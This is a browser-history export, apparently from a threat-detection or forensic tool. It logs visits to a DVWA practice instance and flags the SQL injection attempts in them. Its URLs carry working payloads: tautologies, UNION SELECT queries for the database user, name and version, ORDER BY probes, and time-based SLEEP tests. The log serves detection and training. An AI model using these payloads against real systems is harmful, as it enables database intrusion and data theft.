user,browser,artifact_type,url,title,threat_severity,threat_type,threat_confidence,all_threat_types,browser_name,profile_path,referrer_url,threat_critical_count,threat_description,threat_high_count,threat_low_count,threat_medium_count,threat_mitigation,visit_count,visit_time,visit_type
brows,edge,history,http://52.14.213.75/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%23&Submit=Submit#,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,HIGH,SQLi,0.9,SQLi,edge,,Direct Navigation,0,Potential SQL Injection attack detected in URL parameter,1,0,0,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,2,2025-06-29 17:23:52,
brows,edge,history,http://52.14.213.75/vulnerabilities/sqli/?id=1%27+UNION+SELECT+%40%40version%2C%40%40version_comment%23&Submit=Submit#,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,,,,,edge,,Direct Navigation,,,,,,,2,2025-06-29 17:23:48,
brows,edge,history,http://52.14.213.75/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27--%23&Submit=Submit#,,HIGH,SQLi,0.9,SQLi,edge,,Direct Navigation,0,Potential SQL Injection attack detected in URL parameter,1,0,0,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,2,2025-06-29 17:23:46,
brows,edge,history,http://52.14.213.75/vulnerabilities/sqli/?id=1%27+UNION+SELECT+%40%40version%2C%40%40version_comment%23&Submit=Submit#,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,,,,,edge,,Direct Navigation,,,,,,,2,2025-06-29 17:23:20,
brows,edge,history,http://52.14.213.75/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%28%29%2Cdatabase%28%29%23&Submit=Submit#,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,,,,,edge,,Direct Navigation,,,,,,,1,2025-06-29 17:21:51,
brows,edge,history,http://52.14.213.75/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%23&Submit=Submit#,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,HIGH,SQLi,0.9,SQLi,edge,,Direct Navigation,0,Potential SQL Injection attack detected in URL parameter,1,0,0,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,2,2025-06-29 17:21:18,
brows,edge,history,http://52.14.213.75/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271&Submit=Submit#,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,HIGH,SQLi,0.9,SQLi,edge,,Direct Navigation,0,Potential SQL Injection attack detected in URL parameter,1,0,0,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,14,2025-06-29 17:20:25,
brows,edge,history,http://52.14.213.75/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%28%29%2Cdatabase%28%29--&Submit=Submit#,,,,,,edge,,Direct Navigation,,,,,,,3,2025-06-29 17:19:44,
brows,edge,history,http://52.14.213.75/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271&Submit=Submit#,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,HIGH,SQLi,0.9,SQLi,edge,,Direct Navigation,0,Potential SQL Injection attack detected in URL parameter,1,0,0,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,14,2025-06-29 17:19:39,
brows,edge,history,http://52.14.213.75/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%28%29%2Cdatabase%28%29--&Submit=Submit#,,,,,,edge,,Direct Navigation,,,,,,,3,2025-06-29 17:19:36,
brows,edge,history,http://52.14.213.75/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271&Submit=Submit#,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,HIGH,SQLi,0.9,SQLi,edge,,Direct Navigation,0,Potential SQL Injection attack detected in URL parameter,1,0,0,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,14,2025-06-29 17:19:26,
brows,edge,history,"http://52.14.213.75/vulnerabilities/sqli/?id=?id=1%27%20UNION%20SELECT%20user(),database()--&Submit=Submit",,,,,,edge,,Direct Navigation,,,,,,,1,2025-06-29 17:16:14,
brows,edge,history,http://52.14.213.75/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271&Submit=Submit#,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,HIGH,SQLi,0.9,SQLi,edge,,Direct Navigation,0,Potential SQL Injection attack detected in URL parameter,1,0,0,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,14,2025-06-29 17:15:33,
brows,edge,history,http://52.14.213.75/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%28%29%2Cdatabase%28%29--&Submit=Submit#,,,,,,edge,,Direct Navigation,,,,,,,3,2025-06-29 17:15:31,
brows,edge,history,http://52.14.213.75/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271&Submit=Submit#,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,HIGH,SQLi,0.9,SQLi,edge,,Direct Navigation,0,Potential SQL Injection attack detected in URL parameter,1,0,0,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,14,2025-06-29 17:14:44,
brows,edge,history,http://52.14.213.75/vulnerabilities/sqli/?id=1%27+ORDER+BY+3%3B&Submit=Submit#,,HIGH,SQLi,0.8,SQLi,edge,,Direct Navigation,0,Potential SQL Injection attack detected in URL parameter,1,0,0,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,1,2025-06-29 17:14:40,
brows,edge,history,http://52.14.213.75/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271&Submit=Submit#,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,HIGH,SQLi,0.9,SQLi,edge,,Direct Navigation,0,Potential SQL Injection attack detected in URL parameter,1,0,0,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,14,2025-06-29 17:13:14,
brows,edge,history,http://52.14.213.75/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27+ORDER+BY+3%3B&Submit=Submit#,,HIGH,SQLi,0.9,SQLi,edge,,Direct Navigation,0,Potential SQL Injection attack detected in URL parameter,1,0,0,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,1,2025-06-29 17:13:04,
brows,edge,history,http://52.14.213.75/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271&Submit=Submit#,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,HIGH,SQLi,0.9,SQLi,edge,,Direct Navigation,0,Potential SQL Injection attack detected in URL parameter,1,0,0,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,14,2025-06-29 17:12:31,
brows,edge,history,http://52.14.213.75/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27+ORDER+BY+3--%3B&Submit=Submit#,,,,,,edge,,Direct Navigation,,,,,,,1,2025-06-29 17:12:27,
brows,edge,history,http://52.14.213.75/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271&Submit=Submit#,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,HIGH,SQLi,0.9,SQLi,edge,,Direct Navigation,0,Potential SQL Injection attack detected in URL parameter,1,0,0,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,14,2025-06-29 17:12:01,
brows,edge,history,http://52.14.213.75/vulnerabilities/sqli/?id=1%27+ORDER+BY+3--&Submit=Submit#,,HIGH,SQLi,0.8,SQLi,edge,,Direct Navigation,0,Potential SQL Injection attack detected in URL parameter,1,0,0,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,1,2025-06-29 17:11:59,
brows,edge,history,http://52.14.213.75/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271&Submit=Submit#,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,HIGH,SQLi,0.9,SQLi,edge,,Direct Navigation,0,Potential SQL Injection attack detected in URL parameter,1,0,0,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,14,2025-06-29 17:11:04,
brows,edge,history,http://52.14.213.75/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27--%23&Submit=Submit#,,HIGH,SQLi,0.9,SQLi,edge,,Direct Navigation,0,Potential SQL Injection attack detected in URL parameter,1,0,0,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,2,2025-06-29 17:10:59,
brows,edge,history,http://52.14.213.75/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271&Submit=Submit#,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,HIGH,SQLi,0.9,SQLi,edge,,Direct Navigation,0,Potential SQL Injection attack detected in URL parameter,1,0,0,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,14,2025-06-29 17:10:53,
brows,edge,history,http://52.14.213.75/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27--%3B&Submit=Submit#,,HIGH,SQLi,0.9,SQLi,edge,,Direct Navigation,0,Potential SQL Injection attack detected in URL parameter,1,0,0,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,1,2025-06-29 17:10:49,
brows,edge,history,http://52.14.213.75/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271&Submit=Submit#,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,HIGH,SQLi,0.9,SQLi,edge,,Direct Navigation,0,Potential SQL Injection attack detected in URL parameter,1,0,0,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,14,2025-06-29 17:10:40,
brows,edge,history,http://52.14.213.75/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27--&Submit=Submit#,,HIGH,SQLi,0.9,SQLi,edge,,Direct Navigation,0,Potential SQL Injection attack detected in URL parameter,1,0,0,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,1,2025-06-29 17:10:38,
brows,edge,history,http://52.14.213.75/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271&Submit=Submit#,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,HIGH,SQLi,0.9,SQLi,edge,,Direct Navigation,0,Potential SQL Injection attack detected in URL parameter,1,0,0,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,14,2025-06-29 17:10:31,
brows,edge,history,http://52.14.213.75/vulnerabilities/sqli/?id=1%27+OR+1%3D1--&Submit=Submit#,,HIGH,SQLi,0.9,SQLi,edge,,Direct Navigation,0,Potential SQL Injection attack detected in URL parameter,1,0,0,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,1,2025-06-29 17:10:27,
brows,edge,history,http://52.14.213.75/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271&Submit=Submit#,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,HIGH,SQLi,0.9,SQLi,edge,,Direct Navigation,0,Potential SQL Injection attack detected in URL parameter,1,0,0,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,14,2025-06-29 17:10:14,
brows,edge,history,http://52.14.213.75/vulnerabilities/sqli/?id=1%27+OR+1%3D1%2F*&Submit=Submit#,,HIGH,SQLi,0.9,SQLi,edge,,Direct Navigation,0,Potential SQL Injection attack detected in URL parameter,1,0,0,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,1,2025-06-29 17:10:11,
brows,edge,history,http://52.14.213.75/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271&Submit=Submit#,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,HIGH,SQLi,0.9,SQLi,edge,,Direct Navigation,0,Potential SQL Injection attack detected in URL parameter,1,0,0,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,14,2025-06-29 17:06:28,
brows,edge,history,http://52.14.213.75/vulnerabilities/sqli/?id=1%3D1+OR+%27%27%3B&Submit=Submit#,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,,,,,edge,,Direct Navigation,,,,,,,1,2025-06-29 17:02:22,
brows,edge,history,http://52.14.213.75/vulnerabilities/sqli/?id=1%3D1&Submit=Submit#,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,,,,,edge,,http://52.14.213.75/vulnerabilities/sqli/,,,,,,,2,2025-06-29 17:02:17,
brows,edge,history,http://52.14.213.75/vulnerabilities/sqli/?id=1%3D1+OR+%27&Submit=Submit#,,,,,,edge,,Direct Navigation,,,,,,,1,2025-06-29 17:02:08,
brows,edge,history,http://52.14.213.75/vulnerabilities/sqli/?id=1%3D1&Submit=Submit#,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,,,,,edge,,http://52.14.213.75/vulnerabilities/sqli/,,,,,,,2,2025-06-29 17:01:42,
brows,edge,history,http://52.14.213.75/vulnerabilities/sqli/,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,HIGH,SQLi,0.9,SQLi,edge,,http://52.14.213.75/index.php,0,Potential SQL Injection attack detected in URL parameter,5,0,0,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,1,2025-06-29 17:01:35,
brows,edge,history,http://52.14.213.75/index.php,Welcome :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,,,,,edge,,http://52.14.213.75/login.php,,,,,,,1,2025-06-29 17:01:30,
brows,edge,history,http://52.14.213.75/login.php,Login :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,,,,,edge,,http://52.14.213.75/,,,,,,,1,2025-06-29 17:01:24,
brows,edge,history,http://52.14.213.75/,Login :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,,,,,edge,,Direct Navigation,,,,,,,1,2025-06-29 17:01:24,
brows,firefox,history,http://52.14.213.75/vulnerabilities/sqli_blind/?id=1%27+AND+SLEEP(5)%23&Submit=Submit#,Vulnerability: SQL Injection (Blind) :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,HIGH,SQLi,0.8,SQLi,firefox,C:\Users\brows\AppData\Roaming\Mozilla\Firefox\Profiles/9zkse4hj.default-release,,0,Potential SQL Injection attack detected in URL parameter,1,0,0,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,1,2025-06-29 10:39:24,1
brows,firefox,history,http://52.14.213.75/vulnerabilities/sqli_blind/?id=1%27+AND+SLEEP%285%29%23&Submit=Submit#,Vulnerability: SQL Injection (Blind) :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,HIGH,SQLi,0.8,SQLi,firefox,C:\Users\brows\AppData\Roaming\Mozilla\Firefox\Profiles/9zkse4hj.default-release,,0,Potential SQL Injection attack detected in URL parameter,1,0,0,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,2,2025-06-29 10:39:14,2
brows,firefox,history,http://52.14.213.75/vulnerabilities/sqli_blind/?id=1%27+AND+SLEEP%285%29%23&Submit=Submit#,Vulnerability: SQL Injection (Blind) :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,HIGH,SQLi,0.8,SQLi,firefox,C:\Users\brows\AppData\Roaming\Mozilla\Firefox\Profiles/9zkse4hj.default-release,,0,Potential SQL Injection attack detected in URL parameter,1,0,0,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,2,2025-06-29 10:39:01,1
brows,firefox,history,http://52.14.213.75/vulnerabilities/sqli_blind/,Vulnerability: SQL Injection (Blind) :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,,,,,firefox,C:\Users\brows\AppData\Roaming\Mozilla\Firefox\Profiles/9zkse4hj.default-release,,,,,,,,1,2025-06-29 10:38:48,1
brows,firefox,history,http://52.14.213.75/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%23&Submit=Submit#,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,HIGH,SQLi,0.9,SQLi,firefox,C:\Users\brows\AppData\Roaming\Mozilla\Firefox\Profiles/9zkse4hj.default-release,,0,Potential SQL Injection attack detected in URL parameter,1,0,0,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,2,2025-06-29 10:38:40,2
brows,firefox,history,http://52.14.213.75/vulnerabilities/sqli/?id=1%27+UNION+SELECT+%40%40version%2C%40%40version_comment%23&Submit=Submit#,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,,,,,firefox,C:\Users\brows\AppData\Roaming\Mozilla\Firefox\Profiles/9zkse4hj.default-release,,,,,,,,1,2025-06-29 10:38:23,2
brows,firefox,history,http://52.14.213.75/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%28%29%2Cdatabase%28%29%23&Submit=Submit#,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,,,,,firefox,C:\Users\brows\AppData\Roaming\Mozilla\Firefox\Profiles/9zkse4hj.default-release,,,,,,,,2,2025-06-29 10:38:04,2
brows,firefox,history,http://52.14.213.75/vulnerabilities/sqli/?id=1%27+UNION+SHOW+TABLES%23&Submit=Submit#,,HIGH,SQLi,0.9,SQLi,firefox,C:\Users\brows\AppData\Roaming\Mozilla\Firefox\Profiles/9zkse4hj.default-release,,0,Potential SQL Injection attack detected in URL parameter,1,0,0,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,1,2025-06-29 10:36:57,1
brows,firefox,history,http://52.14.213.75/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%28%29%2Cdatabase%28%29%23&Submit=Submit#,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,,,,,firefox,C:\Users\brows\AppData\Roaming\Mozilla\Firefox\Profiles/9zkse4hj.default-release,,,,,,,,2,2025-06-29 10:36:07,1
brows,firefox,history,http://52.14.213.75/vulnerabilities/sqli/?id=1%27+OR+1%3D1%23&Submit=Submit#,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,HIGH,SQLi,0.9,SQLi,firefox,C:\Users\brows\AppData\Roaming\Mozilla\Firefox\Profiles/9zkse4hj.default-release,,0,Potential SQL Injection attack detected in URL parameter,1,0,0,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,1,2025-06-29 10:35:57,1
brows,firefox,history,http://52.14.213.75/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%23&Submit=Submit#,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,HIGH,SQLi,0.9,SQLi,firefox,C:\Users\brows\AppData\Roaming\Mozilla\Firefox\Profiles/9zkse4hj.default-release,,0,Potential SQL Injection attack detected in URL parameter,1,0,0,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,2,2025-06-29 10:35:35,1
brows,firefox,history,http://52.14.213.75/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271&Submit=Submit#,Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*,HIGH,SQLi,0.9,SQLi,firefox,C:\Users\brows\AppData\Roaming\Mozilla\Firefox\Profiles/9zkse4hj.default-release,,0,Potential SQL Injection attack detected in URL parameter,1,0,0,Use parameterized queries and input validation. Apply principle of least privilege to database access. Implement WAF rules.,1,2025-06-29 10:35:20,1
